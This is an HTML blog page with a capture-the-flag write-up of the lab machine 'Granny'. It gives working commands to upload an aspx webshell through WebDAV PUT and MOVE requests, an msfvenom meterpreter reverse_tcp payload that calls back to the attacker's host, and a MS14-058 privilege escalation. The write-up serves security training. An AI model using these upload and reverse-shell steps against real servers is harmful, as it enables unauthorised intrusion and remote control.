@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Granny | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1.nmap scan it just open port 80,and the web page is a default error page  the header shows that it&#39;s a ASP.NET,so if we can upload aspx files to it,it can excute  use dirsearch to dig pages   webDAVW">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Granny">
+<meta property="og:url" content="http://example.com/2022/07/21/Granny/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.nmap scan it just open port 80,and the web page is a default error page  the header shows that it&#39;s a ASP.NET,so if we can upload aspx files to it,it can excute  use dirsearch to dig pages   webDAVW">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/nmap.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/webpage.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/asp.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/dirsearch.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/webDAV.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/davtest.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/curl.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/aspx.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/shelltxt.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/webshell.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/fail.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/whitespace.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/msf.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/shell.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/localsuggest.png">
+<meta property="og:image" content="http://example.com/2022/07/21/Granny/root.png">
+<meta property="article:published_time" content="2022-07-21T11:25:32.000Z">
+<meta property="article:modified_time" content="2022-07-21T15:32:54.218Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/21/Granny/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Granny" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/21/Granny/" class="article-date">
+  <time class="dt-published" datetime="2022-07-21T11:25:32.000Z" itemprop="datePublished">2022-07-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Granny
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/21/Granny/nmap.png">
+it just open port 80,and the web page is a default error page
+<img src="/2022/07/21/Granny/webpage.png">
+the header shows that it's a ASP.NET,so if we can upload aspx files to it,it can excute
+<img src="/2022/07/21/Granny/asp.png">
+use dirsearch to dig pages
+<img src="/2022/07/21/Granny/dirsearch.png">
+
+<h5 id="webDAV"><a href="#webDAV" class="headerlink" title="webDAV"></a>webDAV</h5><p>Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP.<br><img src="/2022/07/21/Granny/webDAV.png"><br>we can use <a href>davtest</a> to explore further, and it will show me what types of files can be uploaded, and if it can create a directory:</p>
+<pre><code>davtest -url http:10.10.10.15
+</code></pre>
+<img src="/2022/07/21/Granny/davtest.png">
+It looks like there are a lot of file type I can upload, but not aspx, which is what I want.
+The next step is to manul test dav
+First, I’ll put up a text file and verify it’s there:
+
+<pre><code>echo &quot;it&#39;s a test text&quot; &gt; test.txt
+curl -X PUT http://10.10.10.15/123.txt -d @test.txt
+curl http://10.10.10.15/123.txt
+</code></pre>
+<img src="/2022/07/21/Granny/curl.png">
+The first curl puts the file onto the webserver, and the second proves it’s there. The -d @123.txt syntax says that the data for the request should be the contents of the file text.txt.
+Now let's try with .aspx:
+<img src="/2022/07/21/Granny/aspx.png">
+unfortunately,it's really can't allow us to upload aspx
+
+<p>There’s a tool called <code>cadaver</code> that provides command-line WebDAV interactions with a slightly simpler syntax than curl. If I are going to be attacking a WebDAV server, I’ll probably use that just for the shorter commands. That said, I’m going to use <code>curl</code> in this post to show exactly what is happening when I issue these HTTP requests.<br><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/cadaver">cadaver</a></p>
+<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><p>Kali has a simple one at <code>/usr/share/webshells/aspx/cmdasp.aspx</code>, we should copy it </p>
+<pre><code>cp /usr/share/webshells/aspx/cmdasp.aspx .
+</code></pre>
+<p>And now we can upload that to target as a txt using curl and the http put method:</p>
+<pre><code>curl -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx
+</code></pre>
+<p>we can see the site deal the shell as the plain text<br><img src="/2022/07/21/Granny/shelltxt.png"><br>Now we can use the next webdav command, MOVE. Again, I can do this with curl:</p>
+<pre><code>curl -X MOVE -H &#39;Destination:http://10.10.10.15/shell.aspx&#39; http://10.10.10.15/shell.txt
+</code></pre>
+<ul>
+<li>-X MOVE - use the MOVE method</li>
+<li>-H ‘Destination:<a target="_blank" rel="noopener" href="http://10.10.10.15/shell.aspx&#39;">http://10.10.10.15/shell.aspx&#39;</a> - defines where to move to</li>
+<li><a target="_blank" rel="noopener" href="http://10.10.10.15/shell.txt">http://10.10.10.15/shell.txt</a> - the file to move<br>and now we can get a shell<img src="/2022/07/21/Granny/webshell.png"></li>
+</ul>
+<h5 id="reverse-a-shell"><a href="#reverse-a-shell" class="headerlink" title="reverse a shell"></a>reverse a shell</h5><p>using msf,we can reverse a shell</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f aspx &gt; msf.aspx
+</code></pre>
+<p>like the step before,upload it and change it to aspx:</p>
+<pre><code>curl -X PUT http://10.10.10.15/msf.txt -d @msf.aspx
+curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
+</code></pre>
+<p>start msf</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+</code></pre>
+<p>try to trigger it,but failed<br><img src="/2022/07/21/Granny/fail.png"><br>upload it again,and we will see the whitespace is all jacked up:<br><img src="/2022/07/21/Granny/whitespace.png"><br>upload again and use <code>--data-binary</code> to preserve endlines and other control characters</p>
+<pre><code>curl -X PUT http://10.10.10.15/msf.txt --data-binary @msf.aspx
+</code></pre>
+<p>and this time we can see it cleaner:<br><img src="/2022/07/21/Granny/msf.png"></p>
+<pre><code>curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
+</code></pre>
+<p>trigger it,and we can get s shell<br><img src="/2022/07/21/Granny/shell.png"></p>
+<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>First to checkout local exploits, and Metasploit has a nice module for that, <code>post/multi/recon/local_exploit_suggester</code><br><img src="/2022/07/21/Granny/localsuggest.png"><br>and we can use ms14-058<br>finally,we get the root<br><img src="/2022/07/21/Granny/root.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/21/Granny/" data-id="cl5v6ykmy0004yacpai0i30w0" data-title="Granny" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/07/19/FriendZone/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">FriendZone</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/07/21/Granny/">Granny</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/19/FriendZone/">FriendZone</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/18/Delivery/">Delivery</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/17/Horizontall/">Horizontall</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/Previse/">Previse</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
